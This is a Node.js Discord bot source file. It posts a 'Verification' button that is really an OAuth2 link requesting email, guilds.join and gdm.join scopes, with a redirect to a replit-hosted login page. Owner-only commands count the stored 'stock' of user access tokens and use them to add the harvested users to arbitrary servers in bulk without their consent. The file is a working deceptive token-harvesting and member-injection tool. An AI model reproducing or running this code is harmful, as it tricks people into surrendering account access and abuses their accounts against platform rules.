const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js')
const client = new Client({ intents: [ GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildPresences, ] })
const Data = require('./users')
const Users = require('./users')


client.on('ready', () => { 
require('./server')(client)
client.user.setActivity('ERR')
client.user.setStatus('dnd')
})
const owners = ['1163961350888890389','996414655339708528', '1105231113024196703','991063235719471174']

client.on('messageCreate', Message => {
    if (Message.content.startsWith('Ever')) {
      if (!owners.includes(Message.author.id)) return;
        Message.channel.send({ components: [
        new ActionRowBuilder().addComponents(
        new ButtonBuilder().setLabel('Verification').setStyle(ButtonStyle.Link).setURL('https://discord.com/api/oauth2/authorize?client_id=1192599933975531622&response_type=code&redirect_uri=https%3A%2F%2F7ca88e54-0dca-463b-966b-a7d829f44b07-00-3050kg8gn5l64.picard.replit.dev%2Flogin&scope=identify+guilds+email+guilds.join+gdm.join')
    )]})
    }
})
client.on('messageCreate', async Message => {
    if (Message.content.startsWith('E4stock')) {
      if (!owners.includes(Message.author.id)) return;
    const db = await Data.find({})
    Message.reply({ content: `${db.length}`})
    }
 if (Message.content.startsWith('E?stock')) {
      if (!owners.includes(Message.author.id)) return;
    const db = await Data.find({})
    Message.reply({ content: `${db.length}`})
    }
})
client.on('messageCreate', async Message => {
    if (Message.content.startsWith('E4users')) {
      if (!owners.includes(Message.author.id)) return;
    await Data.find({}).then(async (users) => {
        const allusers = users.map( d => d.discordTag)
        allusers.forEach( dd => {
            Message.channel.send({ content: `${dd}`})
        })
    })
    }
  if (Message.content.startsWith('E4' + 'count')) {
    if (!owners.includes(Message.author.id)) return;

      let guildId = Message.guild.id;

    const args = Message.content.slice('E4'.length).trim().split(/ +/);
      if (args.length > 1) {
          guildId = args[1];
      }

      const guild = client.guilds.cache.get(guildId);

      if (!guild) {
          console.log('Guild not found');
          return;
      }

      const usersInDatabase = await Data.find({});
      const discordUserIds = usersInDatabase.map((user) => user.discordId);

      let E = 0;

      guild.members.cache.forEach((member) => {
          if (discordUserIds.includes(member.id)) {
              E++;
          }
      });

      const E1 = discordUserIds.length - E;

      Message.channel.send(`You can add ${E1} more members.`);
      Message.channel.send(`There are already ${E} members in ${guild.name}.`);
  }





      if (Message.content.startsWith('E4check')) {
        if (!owners.includes(Message.author.id)) return;

          const guildId = Message.guild.id;
          const guild = client.guilds.cache.get(guildId);

          if (!guild) {
              console.log('Guild not found');
              return;
          }

          const mentionedMember = Message.mentions.members.first();
          const memberId = mentionedMember ? mentionedMember.id : Message.content.split(' ')[1];
          const userInDatabase = await Data.findOne({ discordId: memberId });

          if (userInDatabase) {
                Message.reply(`<@${memberId}> موثق بالقعل.`);
          } else {
                Message.reply(`<@${memberId}> غير موثق.`);;
          }
      }



})

const DiscordOauth2 = require("discordouth3");
client.on('messageCreate', async message => {
    if (message.content.startsWith('E4' + 'join')) {
      if (!owners.includes(message.author.id)) return;
    const args = message.content.slice('E4'.length).trim().split(/ +/);
    const oauth = new DiscordOauth2();
    let guildId = args[1]
    let count = args[2]
    let guild = client.guilds.cache.get(guildId)
    if (!guildId || !guild) return message.reply({ content: `I'm not in this guild .` })
    if (!count || (isNaN(count) && count !== 'all')) return message.reply({ content: `You should specify a vaild amount of tokens <amount / all> .` })
    const users = await Users.find();
    if (count !== 'all') {
        let members = await guild.members.fetch()
        let xx = users.filter(e => members.find(ee => ee.user.id === e.userId));
        let not = users.filter(e => !members.find(ee => ee.user.id === e.userId));
        if (not.length < count) {
          message?.reply({ content: `There is already **${xx.length}** token in **${guild.name}**\nYou can only add **${not.length}**` })
          return;
        }
        let i = 0
        let r = 0
        let timeout;
        message?.reply(`Tried to add **${count} Token**\n\ :green_circle: success: **${i}**\n 🔴 Failed: **${r}**`).then(m => {
          timeout = setInterval(() => {
            m?.edit(`Tried to add **${count} Token**\n\ 🟢 success: **${i}**\n 🔴Failed: **${r}**`).catch(err => 0)
            if (i + r == count) return clearInterval(timeout)
          }, 5000)
        }).catch(err => 0)
        for (let x = 0; x < count; x++) {
          let user = not[x]
          if (user.accessToken) {
            oauth.addMember({
              accessToken: user.accessToken,
              guildId: guildId,
              botToken: client.token,
              userId: user.discordId,
            }).then(m => {
              i += 1
            }).catch(err => {
              r += 1
            })
          } else {
            r += 1
          }
        }
      }
    }
 if (message.content.startsWith('E?join')) {
      if (!owners.includes(message.author.id)) return;
    const args = message.content.slice('E?join'.length).trim().split(/ +/);
    const oauth = new DiscordOauth2();
    let guildId = args[0]
    let count = args[1]
    let guild = client.guilds.cache.get(guildId)
    if (!guildId || !guild) return message.reply({ content: `I'm not in this guild .` })
    if (!count || (isNaN(count) && count !== 'all')) return message.reply({ content: `You should specify a vaild amount of tokens <amount / all> .` })
    const users = await Users.find();
    if (count === 'all') {
        count = users.length
        let members = await guild.members.fetch()
        let xx = users.filter(e => members.find(ee => ee.user.id === e.userId));
        let not = users.filter(e => !members.find(ee => ee.user.id === e.userId));
        if (not.length < count) {
          message?.reply(`There is already **${xx.length}** token in **${guild.name}**\nYou can only add **${not.length}**`)
          return;
        }
        let i = 0
        let r = 0
        let timeout;
        message?.reply(`Tried to add **${count} Token**\n\nAdded: **${i}**\nFailed: **${r}**\n❄️ The stock ${users.length}`).then(m => {
          timeout = setInterval(() => {
            m?.edit(`Tried to add **${count} Token**\n\nAdded: **${i}**\nFailed: **${r}**\n❄️ The stock ${users.length}`).catch(err => 0)
            if (i + r == count) return clearInterval(timeout)
          }, 5000)
        }).catch(err => 0)
        for (let x = 0; x < count; x++) {
          let user = not[x]
          if (user.accessToken) {
            oauth.addMember({
              accessToken: user.accessToken,
              guildId: guildId,
              botToken: client.token,
              userId: user.discordId,
            }).then(m => {
              i += 1
            }).catch(err => {
              r += 1
            })
          } else {
            r += 1
          }
        }}
    }
})
process.on('unhandledRejection', error => {     console.error('Error has been handler!'); });

client.login(process.env.token)
